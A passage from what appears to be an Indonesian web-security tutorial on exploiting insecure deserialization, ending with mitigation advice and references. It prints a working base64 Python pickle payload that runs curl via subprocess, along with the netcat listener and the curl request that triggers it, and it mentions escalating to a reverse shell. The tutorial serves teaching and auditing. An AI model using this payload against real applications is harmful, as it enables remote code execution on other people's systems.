+public, biasanya penggunaan VPS akan lebih mempermudah hal ini.
+
++------------------------------------
+| $ nc -lv 1337
+| Listening on [0.0.0.0] (family 0, port 1337)
+|
++------------------------------------
+
+Selanjutnya akan dicoba untuk melakukan RCE melalui Object Injection.
+Sesuaikan pembentukan POP Chain dengan versi Python yang digunakan
+target. Apabila kita tidak mengetahui versi Python yang digunakan,
+maka kita dapat mencoba-coba apakah Python yang digunakan adalah versi
+2 atau versi 3. Berikut adalah ketika eksploitasi dilakukan pada
+Python 2, di mana binary python pada environment adalah Python 2.7.
+
++------------------------------------
+| $ python pop.py
+| Y3N1YnByb2Nlc3MKY2FsbApwMAooKGxwMQpTJ2N1cmwnCnAyCmFTJ2xvY2FsaG9zdDox
+| MzM3JwpwMwphdHA0ClJwNQou
+| $ python test.py > /dev/null 2>&1 &
+| $ curl localhost:5000/load/Y3N1YnByb2Nlc3MKY2FsbApwMAooKGxwMQpTJ2N1c
+| mwnCnAyCmFTJ2xvY2FsaG9zdDoxMzM3JwpwMwphdHA0ClJwNQou
++------------------------------------
+
+Pada nc yang sudah melakukan Listen tadi, kita akan mendapatkan HTTP
+Request.
+
++------------------------------------
+| Listening on [0.0.0.0] (family 0, port 1337)
+| GET / HTTP/1.1
+| Host: localhost:1337
+| User-Agent: curl/7.43.0
+| Accept: */*
++------------------------------------
+
+Blind RCE berhasil dilakukan. Untuk selanjutnya kita dapat melakukan
+berbagai kemungkinan payload, misalnya dengan melakukan Reverse TCP
+Shell.
+
+-----| Penutup
+
+Kita telah mempelajari contoh eksploitasi Deserialization pada web app
+yang dibuat dengan PHP dan Python. Untuk bahasa lain, konsepnya sama.
+Ada yang harus menggunakan Object Injection dari Class yang telah
+diimpor pada kode seperti pada PHP dan ada juga yang dapat menggunakan
+kelas sendiri seperti pada Python. Intinya, Deserialization yang
+input-nya dapat diatur oleh user dapat menjadi jalan bagi attacker
+untuk melakukan penyerangan. Penyerangannya sendiri dapat dilakukan
+dengan mengkombinasikannya dengan celah lain seperti RCE, SQL
+Injection, atau bahkan XXE (XML External Entity) Injection.
+
+Penggunaan Deserialization pada input yang dapat dimasukkan oleh user
+secara langsung adalah bad practice. Bahkan, walaupun input-nya bukan
+dari user secara langsung, apabila aplikasi dapat diakali sedemikian
+sehingga input Deserialization dapat diubah user maka hal tersebut
+juga berbahaya. Penggunaan Deserialization yang memiliki kemampuan
+untuk membentuk objek sebaiknya dihindari. Apabila penggunaan
+encoding/decoding biasa seperti JSON biasa tidak dapat mengakomodasi
+kebutuhan aplikasi dan benar-benar terpaksa menggunakan
+Deserialization yang mempunyai kemampuan membuat objek secara
+internal, maka lakukan penyaringan pada input dengan benar. PHP 7
+telah mengimplementasikan PHP RFC: Filtered unserialize() yang
+memungkinkan developer untuk mengspesifikasikan apakah pembentukan
+objek dapat dilakukan atau melakukan whitelist terhadap objek apa saja
+yang dapat dibuat [11]. 
+
+Semoga tulisan ini dapat berguna bagi siapapun yang sedang/ingin
+mempelajari web hacking terutama untuk security analyst yang ingin
+melakukan audit terhadap keamanan web app yang diperiksa.
+
+-----| Referensi
+[1] https://en.wikipedia.org/wiki/Serialization
+[2] https://www.exploit-db.com/exploits/39033/
+[3] https://blog.sucuri.net/2015/06/security-advisory-object-injection-vulnerability-in-woocommerce.html
+[4] http://artsploit.blogspot.co.id/2016/01/paypal-rce.html
+[5] https://github.com/charliesome/charlie.bz/blob/master/posts/rails-3.2.10-remote-code-execution.md
+[6] http://www.exfiltrated.com/research-Instagram-RCE.php
+[7] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0231
+[8] http://php.net/manual/en/language.oop5.php
+[9] http://php.net/manual/en/language.oop5.magic.php
+[10] https://docs.python.org/3/library/pickle.html
+[11] https://wiki.php.net/rfc/secure_unserialize
